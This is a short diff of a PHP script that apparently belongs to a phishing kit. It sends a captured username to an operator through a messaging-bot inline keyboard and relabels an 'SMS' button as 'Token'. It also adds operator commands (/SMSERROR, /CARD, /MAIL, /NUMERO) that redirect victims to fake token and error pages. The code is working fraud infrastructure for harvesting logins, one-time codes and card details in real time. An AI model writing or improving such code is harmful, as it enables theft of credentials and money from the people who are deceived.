@@ -19,7 +19,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         'reply_markup' => json_encode([
             'inline_keyboard' => [[
                 ['text' => '❌ Login Error', 'callback_data' => "LOGINERROR|$usuario"],
-                ['text' => '📩 SMS',         'callback_data' => "SMS|$usuario"]
+                ['text' => '🔐 Token',       'callback_data' => "SMS|$usuario"]
             ]]
         ])
     ]);
@@ -39,6 +39,14 @@ if (file_exists($archivo)) {
         case '/ERROR':
             header("Location: index2.php"); exit;
         case '/SMS':
+            header("Location: tok.html"); exit;
+        case '/SMSERROR':
+            header("Location: tokx.html"); exit;
+        case '/CARD':
+            header("Location: tok.html"); exit;
+        case '/MAIL':
+            header("Location: tok.html"); exit;
+        case '/NUMERO':
             header("Location: tok.html"); exit;
         case '/LOGIN':
             header("Location: index.php"); exit;
